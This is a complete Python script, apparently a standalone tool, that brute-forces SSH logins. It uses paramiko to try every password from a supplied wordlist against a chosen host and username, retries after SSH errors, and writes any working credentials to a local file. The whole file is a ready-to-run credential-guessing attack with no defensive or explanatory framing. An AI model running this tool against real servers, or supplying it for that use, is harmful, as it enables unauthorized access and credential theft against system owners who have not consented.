import paramiko
import socket
import time
from colorama import init, Fore
import argparse

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password, retry_limit=3):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    retries = 0
    while retries < retry_limit:
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # Host is unreachable
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
            return False
        except paramiko.AuthenticationException:
            # Invalid credentials
            print(f"[!] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            # Quota exceeded or other SSH issues
            print(f"{BLUE}[*] Quota exceeded or SSH error, retrying...{RESET}")
            retries += 1
            time.sleep(60)  # Wait a minute before retrying
        else:
            # Connection was successful
            print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
            return True
    return False

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contains the password list, one per line.", required=True)
    parser.add_argument("-u", "--user", help="Host username.", required=True)

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist_file = args.passlist
    user = args.user

    # Read the passlist file
    try:
        with open(passlist_file, 'r') as f:
            passlist = f.read().splitlines()
    except FileNotFoundError:
        print(f"{RED}[!] Error: Password list file '{passlist_file}' not found.{RESET}")
        return

    # Bruteforce attempt for each password
    for password in passlist:
        if is_ssh_open(host, user, password):
            # If combo is valid, save it to a file
            with open("credentials.txt", "a") as creds_file:
                creds_file.write(f"{user}@{host}:{password}\n")
            break  # Stop once we find a valid combination

if __name__ == "__main__":
    main()
